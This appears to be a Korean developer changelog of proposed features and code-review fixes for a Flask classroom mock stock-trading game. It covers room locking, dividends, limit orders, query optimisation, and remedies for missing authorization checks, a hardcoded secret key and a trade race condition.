- **게임 중 신규 참가 잠금 토글 (진행자용)** (`app.py:392-406`, `join_room()`): `join_room()`은 `status='ended'`인 방만 거부하므로 게임 시작 후(`active`/`paused`)에도 새 학생이 자유롭게 입장 가능. 수업 중 지각생 또는 의도치 않은 재입장을 막으려면 `Room` 모델에 `is_locked` 불리언 컬럼(`models.py:25-41`)을 추가하고, 진행자 설정 탭(`index.html:211-307`)에 잠금 토글 버튼과 대응 `POST /api/rooms/<rid>/host/lock` 엔드포인트를 추가. `join_room()` 초반에 `if room.is_locked: return jsonify({'error': '진행자가 입장을 잠갔습니다.'}), 400` 처리.

- **강퇴된 학생 재입장 차단** (`app.py:564-575`, `kick_member()`, `app.py:400-406`, `join_room()`): `kick_member()`는 `RoomMember` 레코드만 삭제하고 별도 차단 목록을 남기지 않아, 강퇴된 학생이 즉시 재입장 가능. `Room` 테이블에 `kicked_users = db.Column(db.Text, default='')` 필드(쉼표 구분 user_id 문자열)를 추가하거나 별도 `RoomKick(room_id, user_id)` 테이블을 신설. `join_room()` 진입 시 `if str(user.id) in (room.kicked_users or '').split(',')` 체크로 재입장 거부. `kick_member()` 삭제 로직(`db.session.delete(m)`) 이후 `kicked_users`에 uid 추가.

- **결과화면 우승자·준우승자 카드에 학번(학번) 표시** (`app.js:1726-1738`, `parseUsername()`): `results-runners-up` 카드(`app.js:1727-1737`)는 `name`만 표시하고 `sid`를 생략. 동명이인이 많은 교실에서 "이 1등이 어느 학생인지" 혼동 유발. 카드 본문에 `<div style="font-size:11px;color:var(--muted)">${escHtml(sid)}</div>` 한 줄 추가로 학번 표시. 1위 우승자 카드(`#results-winner-name`, `app.js:1717-1719`)도 동일하게 학번 부행 추가 필요.

- **`member_total_value()` 배치 로드 버전 추가로 N+1 쿼리 제거** (`app.py:107-118`, `get_rankings()` `app.py:814-824`, `host_members()` `app.py:543-562`): `member_total_value(rid, uid)`는 `RoomHolding.query.filter_by()` + `Deposit.query.filter_by()` 2회 쿼리를 uid당 실행. `get_rankings()`에서 30명을 루프하면 최소 60회 쿼리가 매 10초 폴링마다 발생. `RoomHolding.query.filter_by(room_id=rid).all()`과 `Deposit.query.filter_by(room_id=rid, status='active').all()`을 한 번씩 전체 로드 후 `uid`로 그룹핑하는 `_batch_total_values(rid, svc)` 함수를 `app.py:107` 아래에 추가하고, `get_rankings()`와 `host_members()`에서 사용하면 쿼리 수가 O(n) → O(1)로 감소.

- **진행자→참가자 공지 메시지 브로드캐스트** (`app.py` 신규 엔드포인트, `app.js` 폴링): 진행자가 "지금 반도체 종목에 주목하세요!" 같은 짧은 안내를 참가자 화면에 띄울 수단이 없음. `Room` 모델에 `broadcast_msg = db.Column(db.String(200), default='')` 추가, `POST /api/rooms/<rid>/host/broadcast` 로 저장, `room_dict()`에 포함시켜 10초 폴링으로 참가자에게 전달. 클라이언트에서 이전 값과 달라지면 `toast()` 또는 팝업 표시. 기존 인프라(폴링, room_dict) 그대로 활용해 WebSocket 없이 구현 가능.

- **포트폴리오 페이지에서 직접 매도 버튼 클릭 시 수량 자동 설정** (`app.js:1556-1562`, 보유 종목 "▼ 매도" 버튼): 보유 종목 목록의 "▼ 매도" 버튼이 `openStockModal()`을 호출하지만 `trade-qty` 수량이 초기값 1로 리셋됨. 풀 매도 의도인 경우 수량을 `h.shares`로 자동 설정해줘야 UX가 자연스러움. `openStockModal()` 시그니처에 `defaultQty` 파라미터를 추가하고(`app.js:1327`), 매도 버튼에서 `openStockModal('${h.symbol}', ..., ${h.shares})` 형태로 전달해 `document.getElementById('trade-qty').value = defaultQty || 1`으로 설정.

### 제거/단순화할 것들

- **`SECRET_KEY` 하드코딩 — 소스 유출 시 세션 위조 가능** (`app.py:13`): `app.secret_key = os.environ.get('SECRET_KEY', 'mock-stock-game-secret-2024')` 의 fallback 문자열이 공개 저장소에 노출. 동일 값을 사용하는 Render 배포 인스턴스에서는 누구든 `'mock-stock-game-secret-2024'` 로 서명한 세션 쿠키를 위조해 임의 `user_id`로 로그인 가능. 기본값을 제거하고 `if not os.environ.get('SECRET_KEY'): raise RuntimeError('SECRET_KEY 환경변수를 설정하세요.')` 으로 교체하거나, `secrets.token_hex(32)`를 startup 시 생성해 경고 로그와 함께 사용. Render 대시보드 환경변수에 실제 랜덤 값 설정 필수.

- **거래 내역에서 룰렛 트랜잭션이 '조정'으로 표시 — 학생이 원인을 파악하기 어려움** (`app.py:1065-1067`, `app.js:529,1584`): `action='RLT'` 트랜잭션은 `app.js:529`의 `t.action==='BUY'?'매수':t.action==='SELL'?'매도':'조정'` 분기에서 '조정'으로 표기되고, `txn-badge rlt` CSS 클래스도 별도 스타일 없음. 학생이 거래 내역에서 "조정"이라고만 보이면 룰렛 결과임을 인식 불가. `t.action==='RLT'?'룰렛':t.action==='BUY'?'매수':...` 로 분기 추가하고, `QUIZ` 심볼 ADJ 트랜잭션도 '퀴즈'로 표시. `app.js:529,1584` 두 곳 동일 수정.

- **복권 진행자 UI 모달 3중 구조 — `modal-lottery-start`, `modal-lottery-host`, `modal-lottery-result`** (`index.html:722-774`): 복권 한 사이클에 시작 입력 모달 → 진행 현황 모달 → 결과 모달 세 개의 분리된 `<div class="modal-overlay">`가 연속 등장. 참가자용 `#lottery-overlay` 와도 별도. 코드량이 많고 상태 관리 복잡성이 높아 버그 진입점이 됨. `modal-lottery-start` 와 `modal-lottery-host`를 단일 모달로 합쳐 내부 섹션 show/hide로 단계 전환하면 DOM 노드 수와 JS 이벤트 핸들러 수를 줄일 수 있음.

- **`app.py` 스타트업 인라인 `ALTER TABLE` — 프로덕션에서 잠금 위험** (`app.py:30-40`): 서버 재시작마다 `"ALTER TABLE rooms ADD COLUMN ..."` 3개를 실행하고 이미 존재하면 예외를 롤백. SQLite WAL 모드에서 스키마 변경은 배타적 잠금을 획득하므로, 동시 요청이 있는 Render 환경에서 재시작 지연이 발생할 수 있음. `Flask-Migrate` 또는 별도 `migrate.py` 스크립트로 분리하고, 컬럼 존재 여부를 `PRAGMA table_info(rooms)` 로 먼저 확인해 불필요한 ALTER를 건너뛰는 방식이 안전. 최소한 `with app.app_context()` 블록 자체를 `if __name__ == '__main__'` 바깥 모듈 레벨 초기화에서 별도 함수로 추출해 테스트 가능성 확보.

- **`get_room()` 에서 `cur_user()` 이중 호출** (`app.py:432-473`): `get_room()` 함수 내에서 `cur_user()` 가 `_get_room_cached(room, cur_user().id)` (line 473) 뿐 아니라 종료 조건 분기 `return jsonify(room_dict(room, cur_user().id))` (lines 439, 444)에서도 반복 호출됨. `db.session.get(User, session['user_id'])` 를 매번 실행하므로 한 요청 안에서 최대 3회 DB 조회. 함수 상단에서 `user = cur_user()` 를 한 번 할당 후 재사용하면 DB 왕복 최대 2회 절감.

- **`doAuth()` 닉네임 포맷 `"{sid} {name}"` — 내부 구현 세부사항이 UI에 노출** (`app.js:73-79`, `app.py:330-342`): 학번과 이름을 공백으로 합쳐 `username`으로 저장하는 방식은 `User` 모델 설계상의 임시방편이며, `export_rankings()`의 `u.username.split(' ', 1)` 파싱(`app.py:1435`)이 깨질 수 있는 취약점. 이름에 공백(예: "김 민준")이 포함된 경우 `parts[0]='김'`, `parts[1]='민준'`으로 학번/이름이 뒤바뀜. `User` 모델에 `student_id = db.Column(db.String(20))` 컬럼을 추가하고 `username`에는 이름만 저장하면 파싱 의존성이 사라짐. 기존 호환을 위해 `User.to_dict()`에 `student_id` 포함, 엑셀 내보내기·결과화면에서 직접 참조.


## 2026-07-26 (2차)

### 추가하면 좋을 기능

- **배당금 이벤트 (진행자 트리거)** (`app.py` 신규 엔드포인트, `stock_service.py`): 진행자가 "배당금 지급" 버튼을 누르면 특정 종목 보유자에게 1주당 일정 금액(예: 주당 500원)을 현금으로 지급하는 이벤트. `POST /api/rooms/<rid>/host/dividend` 에서 symbol·per_share를 받아 `RoomHolding.query.filter_by(room_id=rid, symbol=symbol).all()` 루프로 `member.cash += holding.shares * per_share` 처리 후 `RoomTransaction(action='ADJ', note='배당금')` 기록. 실제 주식 교육에서 핵심 개념인 "배당"을 체험시킬 수 있어 교육 효과가 높고, 진행자 설정 탭(`index.html:211-307`) 에 종목 선택 드롭다운과 1주당 금액 입력만 추가하면 구현 가능.

- **섹터별 성과 요약 패널** (`static/js/app.js:1243-1253`, `renderSectors()`, `static/css/style.css`): 현재 섹터 필터 버튼(`app.js:1244`)에는 섹터명만 표시되고 해당 섹터의 평균 등락률이 없음. 각 섹터 버튼 옆에 해당 섹터 전체 종목의 `change_pct` 평균을 `+2.3%` 형식으로 표시하면 학생이 어느 섹터가 강세인지 한눈에 파악. `S.stocks` 배열은 이미 `change_pct`를 포함하므로(`app.py:663-670`) 서버 추가 요청 없이 `renderSectors()` 내에서 `sectors.map(s => { const avg = S.stocks.filter(st => st.sector===s).reduce((a,b) => a+b.change_pct,0)/count; ... })` 계산만 추가. 클라이언트 전용 수정으로 서버 변경 불필요.

- **진행자 게임 시간 연장 버튼** (`app.py:519-537`, `end_room()`, `app.py` 신규 엔드포인트): 현재 진행자가 게임 시간을 늘리려면 일시정지 후 재개해도 남은 시간만 유지됨. `POST /api/rooms/<rid>/host/extend` 엔드포인트를 추가해 `room.end_time += timedelta(minutes=add_minutes)` 처리하면, 진행자 설정 탭에 "+5분 / +10분" 버튼만 추가해 수업이 흥미로운 상황에서 손쉽게 연장 가능. `_invalidate_room_cache(rid)` 호출 필요. 학급 상황에 따라 유연하게 수업을 조율하는 교사의 실제 니즈를 해결.

- **지정가 예약 주문 (Limit Order)** (`app.py` 신규, `models.py` 신규 테이블, `stock_service.py`): 학생이 "삼성전자가 70,000원 이하로 내려오면 100주 자동 매수"처럼 조건부 주문을 예약할 수 있는 기능. `RoomOrder(room_id, user_id, symbol, action, shares, limit_price, status)` 모델 추가. `get_price()` 호출 시점 또는 별도 주기적 체크(`stock_service.py`)에서 활성 예약 주문과 현재 가격을 대조해 조건 충족 시 `trade()` 동일 로직 실행. 고급 교육 기능이지만 실제 증권 거래의 핵심 개념을 체험하게 해줌. 진행자가 활성화·비활성화 가능한 옵션 플래그로 선택적 제공.

- **익명 순위 모드** (`app.py:808-824`, `get_rankings()`, `app.js:735-753`, `refreshMyRank()`): 공개 순위에서 학생 이름 대신 "참가자 1", "참가자 2" 또는 동물 코드네임("호랑이팀")을 표시하는 모드. 자신의 실제 순위는 자기 자신만 확인 가능하고 `is_me: True` 항목에만 실명 표시. `Room` 모델에 `anonymous_rankings = db.Column(db.Boolean, default=False)` 추가, `get_rankings()` 에서 `if room.anonymous_rankings and not entry['is_me']: entry['username'] = f'참가자 {entry["rank"]}'` 처리. 성적 노출이 부담스러운 학생을 배려하면서 경쟁 동기는 유지.

- **퀴즈 정오답 통계 (진행자 패널 표시)** (`app.py:1245-1342`, `_quiz_state`, `app.py:543-562`, `host_members()`): `_quiz_state[key]` 에 `correct_count`·`wrong_count` 필드를 추가하고(`submit_quiz()` app.py:1339 커밋 전에 카운트 증감), `host_members()` 응답에 포함시키면(`app.py:556`) 진행자 순위 패널에 각 학생의 "퀴즈 O/X" 통계를 표시 가능. 누가 금융 지식이 부족한지 실시간 파악해 수업 중 보충 설명 타이밍을 잡는 데 유용. 인메모리 카운터이므로 DB 변경 불필요, 서버 재시작 시 초기화되는 것은 허용 가능 범위.

- **`loadDepositsPage()` 이중 API 호출 통합** (`app.js:1621-1627`): `loadDepositsPage()`는 `/api/rooms/<rid>/portfolio`(현금 조회)와 `/api/rooms/<rid>/deposits`를 순차적으로 호출. 이 두 요청이 독립적이라 `Promise.all()`로 병렬화하거나, `get_deposits()` 응답(app.py:852-876)에 `current_cash` 필드를 추가해 단일 요청으로 통합하면 예금 탭 진입 레이턴시를 절반으로 줄임. 현재 `const port = await api.get(...); ...const data = await api.get(...)` 직렬 구조를 `const [port, data] = await Promise.all([api.get(...), api.get(...)])` 한 줄로 변경 가능.

### 제거/단순화할 것들

- **`lobby_members()` 권한 미확인 — 비인가 사용자가 참여자 목록 열람 가능** (`app.py:577-585`): `lobby_members()`는 `Room.query.get_or_404(rid)` 이후 바로 RoomMember를 조회해 반환함. 로그인만 되어 있으면 방 ID를 알고 있는 누구든 특정 방의 전체 참여자 목록(user_id, username)을 획득 가능. 최소한 `if room.host_id != cur_user().id and not RoomMember.query.filter_by(room_id=rid, user_id=cur_user().id).first(): return jsonify({'error': '권한 없음'}), 403` 를 추가해 호스트 또는 해당 방 참여자만 접근하도록 제한. 학생 정보 노출 최소화 필요.

- **`minigame_close()` 에서 deprecated `Room.query.get(rid)` 사용** (`app.py:977`): `room = Room.query.get(rid)` 는 SQLAlchemy 2.x에서 제거된 레거시 `Query.get()` API. `get_room()` (app.py:435), `start_room()` (app.py:478) 등 다수 엔드포인트는 이미 `Room.query.get_or_404(rid)` 또는 `db.session.get(Room, rid)`로 전환됐으나 `minigame_close()` 만 누락. `room = db.session.get(Room, rid)` 로 교체하면 SQLAlchemy 2.x 이전 버전에서 발생하는 `LegacyAPIWarning` 제거. `Room.query.get` 패턴이 남아 있는 다른 위치도 `grep -n "query.get"` 으로 일괄 확인 권장.

- **`create_room()` 에서 코드 중복 생성 시 IntegrityError 미처리** (`app.py:388-389`, `models.py:8-13`): `gen_code()` 는 루프에서 uniqueness를 확인하지만(`models.py:11`), 두 요청이 동시에 동일 코드를 생성하고 동시에 `db.session.commit()` 하면 DB UNIQUE 제약에 의해 `IntegrityError`가 발생. `join_room()` 은 line 403에서 이를 처리하지만 `create_room()` 은 처리 없이 500 에러로 노출됨. `try: db.session.add(room); db.session.commit() except IntegrityError: db.session.rollback(); room.code = gen_code(); db.session.add(room); db.session.commit()` 패턴으로 재시도하거나, 최소한 500을 400으로 감싸는 에러 핸들러 추가.

- **`create_deposit()` 입금 금액 상한선 없음 — 임의 대형 부동소수점 허용** (`app.py:889`): `if not (0 < amount < float('inf'))` 조건은 `1e300`이나 `999999999999` 같은 천문학적 금액도 통과. 잔액 확인(`m.cash < amount`) 이 있으므로 실제 잔액을 초과한 입금은 막히지만, 학생이 개발자 도구로 요청을 위조해 `amount=S.room.starting_cash * 1000` 같은 값을 보낼 때 잔액 확인에서 막히더라도 서버가 `float('inf')` 비교까지 수행하는 비용이 생김. 현실적 상한(`if amount > 1e13: return jsonify({'error': '금액 초과'}), 400`)을 추가하고, `deposit_rate` 적용 후 이자도 정수 범위를 벗어나지 않는지 확인.

- **`openStockModal()` 매번 포트폴리오 전체 조회** (`app.js:1344-1352`): 학생이 주식 카드를 탭할 때마다 `GET /api/rooms/<rid>/portfolio`가 호출되고, 서버는 `RoomHolding` + `Deposit` 쿼리를 실행해 전체 포트폴리오를 계산. 필요한 정보는 `cash`와 해당 `symbol`의 `shares`뿐. `GET /api/rooms/<rid>/stocks/<symbol>/holding` 같은 경량 엔드포인트를 추가하거나, `enterParticipantGame()` 시 포트폴리오를 한 번 캐시(`S.portfolio`)하고 거래·예금 후에만 갱신하면 불필요한 DB 조회를 대폭 줄일 수 있음. 30명 × 5회 탭/분 기준으로 150 portfolio 쿼리/분이 절감.

- **`host_adjust()` delta 값 범위 미검증** (`app.py:595-603`): `delta = float(d.get('delta', 0))` 이후 `m.cash = max(0, m.cash + delta)` 로 즉시 적용. delta가 `-1e15` 같은 극단값이면 cash가 0으로 강제되고, `+1e15`면 cash가 천문학적으로 커짐. DB는 Float 타입이라 저장 자체는 되지만 UI 표시가 깨지고 엑셀 내보내기 수치도 오염. `if abs(delta) > room.starting_cash * 10: return jsonify({'error': '조정 한도 초과'}), 400` 처럼 시작 자금 기준 합리적 상한을 설정. 또한 `note = d.get('note', '...')` 에도 `[:200]` 슬라이싱으로 DB 컬럼 길이 초과를 방어.

- **`doRouletteSpin()` 4300ms 대기 후 DOM 접근 — 모달 닫힘 시 오류 가능** (`app.js:1062-1096`): `await new Promise(r => setTimeout(r, 4300))` 동안 학생이 `closeRoulette()`를 호출(자동 닫기 타이머가 60초 → 0이 되기 전에 수동 닫기)하면 오버레이가 숨겨진 상태에서 이후 코드가 `document.getElementById('rlt-result')`, `document.getElementById('rlt-spins')` 등 DOM을 업데이트함. 요소 자체는 존재하므로 예외는 안 나지만 숨겨진 UI를 수정해 다음 번 열 때 이전 결과가 잔재. `let _spinAborted = false` 플래그를 `closeRoulette()` 에서 set하고 `setTimeout` 이후 `if (_spinAborted) return` 가드를 추가하면 해결. 또는 `openRouletteModal()` 진입 시 플래그 초기화.


---

## 2026-07-27

### 추가하면 좋을 기능

- **거래 모달에 "최대 매수 가능 수량" 실시간 표시** (`app.py:747-748`, 거래 모달 프론트): 현재 매수 모달에 수량 입력란만 있고, 보유 현금으로 몇 주까지 살 수 있는지 표시되지 않음. 서버 변경 없이 `openStockModal()` 내에서 `Math.floor(S.tradeCash / price)` 를 계산해 "최대 X주 (≈ Y원)" 를 input 아래에 한 줄 표시하면 됨. 학생들이 잔액 초과 오류를 반복적으로 받는 가장 흔한 UX 마찰 지점이므로 즉각적인 개선 효과가 큼.

- **보유 종목 전량 매도 버튼** (`app.js` holdings 렌더링 부분, `app.py:757-762`): 포트폴리오 보유 종목 카드에 "전량 매도" 버튼이 없어, 게임 종료 직전 청산을 원하는 학생이 보유 수량을 직접 입력해야 함. 홀딩 카드 렌더링 시 `<button onclick="quickSellAll('${h.symbol}', ${h.shares})">전량 매도</button>` 를 추가하고 `quickSellAll()` 에서 `shares=h.shares` 로 trade API를 호출하면 서버 변경 없이 구현 가능. 룰렛 베팅 시 강제 청산 로직(`app.py:1026-1047`)과 개념적으로 동일하므로 검증된 패턴임.

- **퀴즈 설정·룰렛 설정 DB 영속화** (`app.py:1246 _quiz_settings`, `app.py:250 _roulette_config`): 두 설정 모두 순수 인메모리 dict로, Render free tier에서 수면 후 재기동될 때마다 기본값으로 초기화됨. `Room` 모델에 `quiz_reward_pct FLOAT DEFAULT 1.0`, `quiz_penalty_pct FLOAT DEFAULT 0.5`, `roulette_config JSON` 컬럼(또는 VARCHAR)을 추가하고 POST 시 DB에 저장·GET 시 DB에서 로드하면 재기동 안전성 확보. `app.py:31-40`의 ALTER TABLE 패턴 그대로 마이그레이션 가능.

- **진행자 대시보드에 "최근 미활동 학생" 표시** (`app.py:542-561 host_members()`, `models.py:47-54 RoomMember`): 현재 진행자는 학생이 실제로 게임에 접속 중인지 알 방법이 없음. `RoomMember`에 `last_seen_at DATETIME` 컬럼을 추가하고, 학생이 `/api/rooms/<rid>` 또는 `/api/rooms/<rid>/portfolio`를 호출할 때 갱신하면 됨. `host_members()` 응답에 포함시켜 3분 이상 미응답 학생에게 ⚠️ 뱃지를 표시하면 교사가 "그 학생 핸드폰 확인해" 같은 즉각적인 개입이 가능.

- **실제 게임 가격 히스토리 저장** (`stock_service.py:281-310 get_history()`): 현재 차트는 `현재가`에서 역방향으로 랜덤 OHLC를 생성하므로(`stock_service.py:296-309`), 새로고침마다 과거 차트가 달라지고 실제 인게임 가격 변동과 무관. `StockService._prices` 업데이트 시(`get_price()` 내 TTL 만료 분기, `force_price()`) 간단한 링 버퍼 `_price_log: dict[str, deque]`에 `(timestamp, price)` 를 최대 200개 append하면 실제 인게임 가격 흐름을 차트로 보여줄 수 있음. 이것이 교육적 가치가 훨씬 높음.

### 제거/단순화할 것들

- **참여자 게임 루프의 독립 타이머 4개 통합** (`app.js:613-651 enterParticipantGame()`, `app.js:807-826 startNewsPolling()`): 참여자 게임 화면에서 `setInterval(roomPoll, 10000)`, `setInterval(newsPoll, 8000)`, `setInterval(timerTick, 1000)` 세 타이머가 독립 실행되고, 각 루프 내에서 `refreshMyRank()` (rankings API), `loadMarket()` (stocks API) 가 추가로 호출됨. 학생 30명 기준 10초마다 약 120~150개 요청이 Render 단일 인스턴스에 집중. roomPoll에서 `minigame_available`, `lottery_active`, `status` 변경만 감지하고 필요한 데이터를 aggregated endpoint 하나로 받는 구조로 변경하면 서버 부하가 50% 이상 감소 예상.

- **엑셀 내보내기 학번·이름 파싱 취약점** (`app.py:1435-1437`): `parts = u.username.split(' ', 1)` 로 첫 공백 기준 학번/이름을 분리하는 방식은, 학생이 "학번 이름" 형태가 아닌 이름만 입력했을 경우(`sid=''`, `name=전체입력값`) 엑셀의 "학번" 열이 공백으로 출력됨. 또한 학번에 공백이 없어도 이름에 공백이 포함되면(`'홍 길동'`) 학번이 이름 일부로 파싱됨. 파싱 실패 시 셀에 "(학번 없음)" 또는 원래 username 전체를 표시하는 fallback을 추가하거나, 입력 폼에서 학번/이름을 별도 필드로 받되 서버에서 구조화해 저장하는 방향으로 개선 필요.

- **`_lots`, `_rlt_active` 인메모리 상태가 종료된 방에 무기한 잔류** (`app.py:155-161 _end_room()`): `_end_room()` 에서 `_lots.pop(room.id, None)`, `_rlt_active.pop(room.id, None)` 로 정리되지만, 방이 갑자기 에러로 종료되거나 서버 재시작 없이 오래 실행될 경우 종료된 방의 데이터가 dict에 남을 수 있음. 주기적 GC(예: 1시간마다 ended 방 ID 조회 후 관련 인메모리 키 삭제)를 추가하면 장시간 운영 시 메모리 누수 방지 가능. Render free tier는 재기동이 잦아 실제 문제 빈도는 낮지만 유료 전환 시 주의 필요.

## 2026-07-27 (2차)

### 추가하면 좋을 기능

- **거래 수량 range 슬라이더** (`static/index.html` 거래 모달, `app.js:openStockModal()`): 수량 입력이 텍스트 박스만 있어 터치스크린에서 불편. `<input type="range">` 를 `trade-qty` 아래에 추가하고, 최댓값을 매수 시 `Math.floor(tradeCash/price)`, 매도 시 `holding.shares` 로 동적 설정. 서버 변경 없이 HTML/JS 약 10줄로 구현 가능하며 학생 스마트폰 환경에서 UX가 크게 개선됨.

- **결과 화면 "최고 단일 매도 수익 거래" 배너** (`app.js:1760-1775 loadResults()`, `app.py` 신규 엔드포인트): `results-my-stats` 블록에 순위·자산·수익률만 표시되고 가장 수익이 좋았던 단일 거래 정보가 없음. `GET /api/rooms/<rid>/best-trade` 를 신설해 `RoomTransaction` 에서 매도(`action='SELL'`) 최고 `amount` 행을 조회하고 결과 화면에 "최고 매도 수익: +X원 (종목)" 카드를 추가하면 수업 마무리 토론에 활용 가능.

- **종목 모달에서 같은 방 보유자 수 표시** (`app.py:651-671 get_stocks()`, `app.js:1327 openStockModal()`): `get_stocks()` 응답 각 종목에 `holder_count` 필드 추가 (`RoomHolding.query.filter_by(room_id=rid, symbol=sym).filter(RoomHolding.shares > 0).count()`), 종목 모달 상단에 "N명 보유 중" 배지 표시. 군중심리·쏠림 현상을 실시간으로 관찰하는 교육적 기능으로 활용 가능.

- **진행자 종목 거래 잠금 기능** (`app.py:724-766 trade()`, `models.py Room`): `Room` 에 `disabled_symbols = db.Column(db.Text, default='')` 컬럼 추가, `trade()` 진입 시 잠긴 종목이면 403 반환, `POST /api/rooms/<rid>/host/lock-symbols` 엔드포인트 신설. "오늘 수업에서는 IT 섹터만 거래" 같은 수업 시나리오를 코드 수정 없이 진행자 UI에서 제어 가능.

- **게임 종료 후 개인 전체 거래 통계 카드** (`app.js:1760-1775 loadResults()`, `app.py` 신규): 결과 화면 "내 결과" 섹션에 총 거래 횟수·매수 총액·매도 총액이 없음. `GET /api/rooms/<rid>/my-summary` 에서 `RoomTransaction` 집계 후 JSON 반환, 결과 화면에 "총 N회 거래 | 매수 X원 | 매도 Y원" 통계 줄 추가. 학생 스스로 거래 패턴을 돌아볼 수 있는 반성 자료가 됨.

### 제거/단순화할 것들

- **`lottery_skip()` DB 저장 누락으로 서버 재시작 시 스킵 회차 재발동** (`app.py:1209-1219`): `_lots[rid]['done'].add(round_n)` 이후 `Room.lottery_rounds_done` DB 컬럼을 갱신하지 않아, Render 재기동 시 인메모리 상태가 초기화되면 이미 진행자가 스킵한 회차가 다시 활성화됨. `lot['done']` 갱신 직후 `room.lottery_rounds_done = ','.join(str(r) for r in lot['done']); db.session.commit()` 를 추가해 DB와 동기화해야 함.

- **`withdraw_deposit()` 강퇴 학생 예금 해지 시 `m=None` → AttributeError** (`app.py:912-914`): 강퇴된 학생의 `RoomMember` 행이 삭제된 상태에서 예금 해지 요청이 오면 `m = RoomMember.query.filter_by(...).first()` 가 `None` 을 반환하고 이후 `m.cash += dep.amount` 에서 AttributeError 발생. `if not m: dep.status = 'withdrawn'; db.session.commit(); return jsonify({'ok': True})` 분기를 추가해 예금금액을 복구 불가로 처리하거나, 강퇴 시 활성 예금을 자동 해지하는 로직을 `kick_member()` 에 넣어야 함.

- **`trade()` 동시 요청 시 잔액 이중 차감 경쟁 조건** (`app.py:747-751`): `if member.cash < amount` 체크와 `member.cash -= amount` 사이에 DB 레벨 락이 없어 같은 사용자가 두 요청을 동시에 보내면 잔액 부족 상태에서 두 번 차감될 수 있음. `RoomMember.query.filter_by(...).with_for_update().first()` 또는 `db.session.execute(update(RoomMember).where(...).values(cash=RoomMember.cash - amount).where(RoomMember.cash >= amount))` 의 원자적 업데이트로 해결 가능.

- **`get_chart()` · `get_room_news()` 방 소속 검증 누락** (`app.py:703-707`, `app.py:710-719`): 두 엔드포인트 모두 `Room.query.get_or_404(rid)` 만 수행하고 요청자가 해당 방 멤버인지 확인하지 않음. 로그인한 임의 사용자가 다른 방의 뉴스와 차트를 열람 가능. `RoomMember.query.filter_by(room_id=rid, user_id=user.id).first_or_404()` 한 줄 추가로 수정 가능.

- **`room_dict()` 에서 `member_count` COUNT 쿼리 매 호출 실행** (`app.py:297`): 방 목록·상태 조회마다 `RoomMember.query.filter_by(room_id=room.id).count()` 가 별도 SQL로 실행됨. `Room` 모델에 이미 `members` relationship이 있으므로 `len(room.members)` 로 대체하거나 (이미 로드된 경우), `room_dict()` 호출 전 `joinedload(Room.members)` 를 사용해 N+1 패턴 제거.

- **`get_room()` 룰렛 트리거 판단 시 멤버별 COUNT 쿼리 N회 실행** (`app.py:449-453`): `has_spins = any(RoomTransaction.query.filter_by(..., action='RLT').count() < 3 for m in non_host)` 패턴이 멤버 수만큼 별도 COUNT SQL을 발행. `db.session.query(RoomTransaction.user_id, func.count()).filter_by(room_id=rid, action='RLT').group_by(RoomTransaction.user_id).all()` 한 번으로 집계한 뒤 메모리에서 비교하면 쿼리 수가 1개로 줄어듦.

---

## 2026-07-28

### 추가하면 좋을 기능

- **엑셀 다운로드에 전체 거래 내역 시트 추가** (`app.py:1419-1488`, `export_rankings()`): 현재 최종 순위 시트 하나만 생성함. `wb.create_sheet('거래 내역')`을 추가해 `RoomTransaction.query.filter_by(room_id=rid).order_by(timestamp).all()`로 모든 학생의 매수·매도·룰렛·퀴즈 기록을 두 번째 시트에 기록하면 선생님이 수업 후 학생별 행동 패턴을 엑셀에서 직접 분석 가능. 서버 코드 약 20줄 추가, 클라이언트 변경 없음.

- **거래 모달에 "최대 수량" 버튼 추가** (`app.js:openStockModal()`, `static/index.html` 거래 모달): 현재 주식 수량을 직접 타이핑해야 해 스마트폰에서 불편함. 매수 시 `Math.floor(S.tradeCash / S.tradePrice)`, 매도 시 `S.tradeHolding`을 trade-qty에 자동 입력하는 "전량" 버튼을 `<input id="trade-qty">` 옆에 추가하면 터치 환경에서 UX가 크게 개선됨. HTML 1줄·JS 1줄로 구현 가능.

- **퀴즈 설정을 Room 모델에 저장해 서버 재시작 후에도 유지** (`app.py:1246`, `app.py:1399-1414`, `models.py`): `_quiz_settings` 딕셔너리는 in-memory 상태여서 Render 무료 인스턴스가 재기동되면 진행자가 설정한 `reward_pct`·`penalty_pct`가 기본값(1%, 0.5%)으로 초기화됨. `rooms` 테이블에 `quiz_reward_pct FLOAT DEFAULT 1.0`, `quiz_penalty_pct FLOAT DEFAULT 0.5` 컬럼 추가(`app.py:31-40` ALTER 패턴 활용) 후 `quiz_settings()`에서 DB read/write하면 재기동 내구성 확보.

- **진행자 대시보드에 실시간 참여 지표 카드 추가** (`app.py:542-561`, `host_members()`): 현재 순위 목록만 표시되고 "방 전체에서 오늘 몇 건 거래가 발생했는지, 가장 활발한 학생은 누구인지" 요약 정보가 없음. `RoomTransaction.query.filter_by(room_id=rid).count()`와 `GROUP BY user_id`를 활용해 총 거래 수, 1위 거래왕 학생, 가장 많이 거래된 종목 3개를 `GET /api/rooms/<rid>/host/activity-summary`로 제공하고 순위 탭 상단에 미니 카드 3개로 표시하면 수업 참여도 모니터링이 가능.

- **주가 급변 임계 배지 표시** (`stock_service.py:129-139`, `app.js:loadMarket()`): 가격 변동폭이 vol 기준으로 크게 벌어질 수 있으나 학생 시세 목록에 "현재 변동폭이 오늘 최대치" 같은 시각적 신호가 없음. `StockService`에 `_session_high`·`_session_low` 딕셔너리를 추가해 `get_price()`에서 갱신하고, `get_stocks()` 응답에 `is_high: bool`, `is_low: bool` 필드를 추가. `app.js` 시세 카드에 "📈 신고가" / "📉 신저가" 배지를 보여주면 투자 타이밍 교육에 활용 가능.

### 제거/단순화할 것들

- **`get_stocks()` 방 멤버 여부 미검증 — 다른 방 시세 무단 열람 가능** (`app.py:651-671`): `@login_required`와 `Room.query.get_or_404(rid)` 만 있고 `RoomMember` 확인이 없음. 로그인한 사용자가 임의 `rid`로 `GET /api/rooms/{rid}/stocks`를 요청하면 다른 방의 모든 시세(초기화 가격 포함)를 볼 수 있음. `app.py:655` 이후에 `if not RoomMember.query.filter_by(room_id=rid, user_id=cur_user().id).first() and room.host_id != cur_user().id: return jsonify({'error': '권한 없음'}), 403`을 추가하면 됨.

- **`RoomMember.cash`·`RoomHolding.avg_price`가 `Float` 타입 — 금융 계산 정밀도 손실** (`models.py:52`, `models.py:62`): SQLAlchemy `Float`은 IEEE 754 부동소수점으로 저장되어 누적 매수·이자 계산 시 1~2원 단위 반올림 오차가 쌓임. `db.Column(db.Numeric(precision=18, scale=2))` 로 교체하거나 단기적으로 모든 계산 후 `round(..., 0)`을 일관되게 적용하면 정산 결과 불일치를 방지할 수 있음. (현재 일부 경로만 `round()` 처리, 누락된 경로 있음.)

